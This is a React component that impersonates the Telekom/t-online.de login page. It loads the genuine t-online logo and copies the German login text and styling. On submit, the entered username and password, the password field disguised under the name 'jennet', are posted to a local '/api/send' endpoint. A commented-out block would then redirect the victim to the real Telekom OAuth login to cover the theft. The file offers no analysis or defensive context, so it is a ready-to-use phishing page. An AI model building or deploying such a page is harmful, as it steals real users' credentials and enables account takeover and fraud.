"use client";
import { useRef } from "react";
import axios from "axios";

export default function Body() {
  const eyes = useRef<HTMLInputElement>(null);
  const forma = useRef<HTMLFormElement>(null);

  const handleClickEye = () => {
    if (eyes.current) {
      if (eyes.current.type === "password") {
        eyes.current.type = "text";
      } else {
        eyes.current.type = "password";
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const dataObj: { [key: string]: string } = {};
    if (forma.current) {
      const data = new FormData(forma.current);

      for (const [key, val] of data.entries()) {
        dataObj[key] = val as string;
      }
    }

    try {
      const result = await axios.post("/api/send", JSON.stringify(dataObj));

      console.log(result);

      // if (result.status === 200) {
      //   return window.location.replace(
      //     "https://accounts.login.idm.telekom.com/oauth2/auth?response_type=code&client_id=10LIVESAM30000004901PORTALE0000000000000&scope=openid&state=Be6ggoEV5lb2j-2BLIP8anQZdw4-SLN-hixcqHEKRFA%3D&redirect_uri=https://www.t-online.de/auth/login/oauth2/code/telekom&nonce=ekLsCCgWBjMpG22W_XggRabM1WKWb7E5Y9wbblcbkl4&display=popup&claims=%7B%22id_token%22:%7B%22urn:telekom.com:all%22:null%7D%7D%0A"
      //   );
      // }
      return;
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <main className="mb-10">
      <div className="w-11/12 sm:w-[510px] mx-auto flex flex-col items-center mt-6 ">
        <div>
          <img
            src="https://www.t-online.de/auth/t-online-logo-29112019.png"
            alt=""
          />
        </div>

        <h1 className="text-2xl sm:text-4xl text-[#6c6c6c] font-light sm:font-extralight text-start sm:text-center mt-9">
          Telekom Login Passwort eingeben
        </h1>

        <form
          action=""
          ref={forma}
          className="w-full mt-10 px-2"
          onSubmit={handleSubmit}
        >
          <div className="relative h-[3.4rem] w-full">
            <input
              type="email"
              className="peer h-full w-full hover:bg-[#ededed] rounded-md text-[#6c6c6c] border border-gray-400 outline-none px-2 py-0 placeholder:text-[#6c6c6c] placeholder:font-light focus:placeholder:invisible"
              placeholder="Benutzername"
              name="email"
              id="email"
              required
            />
            <label
              htmlFor="email"
              className="absolute top-1 left-2 h-5 text-[#6c6c6c] font-light text-xs peer-placeholder-shown:invisible visible peer-focus:visible"
            >
              Benutzername
            </label>
          </div>

          <p className="font-light text-sm text-end text-[#007faf] my-2 hover:underline cursor-pointer">
            Nicht Ihr Benutzername?
          </p>

          <div className="relative h-[3.4rem] w-full">
            <input
              type="password"
              className="peer h-full w-full hover:bg-[#ededed] rounded-md text-[#6c6c6c] border border-gray-400 outline-none px-2 py-0 placeholder:text-[#6c6c6c] placeholder:font-light focus:placeholder:invisible"
              placeholder="Passwort"
              name="jennet"
              id="jennet"
              ref={eyes}
              required
            />

            <label
              htmlFor="jennet"
              className="absolute top-1 left-2  h-5 text-[#6c6c6c] font-light text-xs peer-placeholder-shown:invisible visible peer-focus:visible"
            >
              Passwort
            </label>

            <svg
              xmlns="http://www.w3.org/2000/svg"
              onClick={handleClickEye}
              fill="none"
              viewBox="0 0 24 24"
              strokeWidth={1.5}
              stroke="#007faf"
              className="w-6 h-6 absolute right-3 top-4 cursor-pointer"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"
              />
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
              />
            </svg>
          </div>

          <div role="checkbox" className="flex space-x-3 mt-2">
            <input
              type="checkbox"
              name="check"
              id="check"
              className="h-5 w-5 bg-[#ededed] checked:text-[#ededed]"
            />
            <label htmlFor="check" className="text-[#6c6c6c] font-light pb-2">
              Angemeldet bleiben
            </label>
          </div>

          <input
            type="submit"
            value="Login"
            className="h-12 rounded-md w-full bg-[#e20074] cursor-pointer hover:bg-[#b2005c] text-white"
          />

          <input
            type="button"
            value="Andere Anmeldeoptionen"
            className="h-12 rounded-md w-full bg-[#ededed] cursor-pointer hover:saturate-100 border border-gray-400 font-light mt-3"
          />

          <h1 className="font-light text-base text-center mt-4">
            Passwort vergessen?
          </h1>
          <h1 className="font-light text-base text-center mt-0">
            Bitte nutzen Sie „Andere Anmeldeoptionen“.
          </h1>
        </form>
      </div>
    </main>
  );
}
